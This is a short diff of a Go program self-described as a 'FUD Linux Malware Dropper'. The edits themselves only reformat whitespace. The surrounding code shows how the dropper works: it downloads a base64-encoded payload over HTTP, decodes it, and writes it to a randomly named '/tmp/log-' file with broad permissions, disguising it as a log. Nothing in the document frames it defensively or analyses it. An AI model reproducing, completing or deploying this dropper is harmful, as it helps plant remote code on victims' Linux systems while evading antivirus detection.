@@ -1,7 +1,7 @@
 /*
  * Author : Nemuel Wainaina
  * Alpha : FUD Linux Malware Dropper
-*/
+ */
 
 package main
 
@@ -24,7 +24,7 @@ const (
 
 var (
 	PAYLOAD []byte
-	FILE string
+	FILE    string
 )
 
 func main() {
@@ -76,13 +76,13 @@ func fetch_payload() {
 	body := resp.Body
 	b64content, _ := io.ReadAll(body)
 	b64str := string(b64content)
-	result := b64str[2:len(b64str)-1]
+	result := b64str[2 : len(b64str)-1]
 	PAYLOAD, _ = b64.StdEncoding.DecodeString(string(result))
 }
 
 func deploy(payload []byte) {
 	rand.Seed(time.Now().UnixNano())
-	file_name := fmt.Sprintf("log-%d", (rand.Intn(9999-1111)+1111))
+	file_name := fmt.Sprintf("log-%d", (rand.Intn(9999-1111) + 1111))
 	FILE = fmt.Sprintf("/tmp/%s", file_name)
 	file, _ := os.OpenFile(FILE, os.O_CREATE|os.O_WRONLY, 0766)
 	file.Write(PAYLOAD)
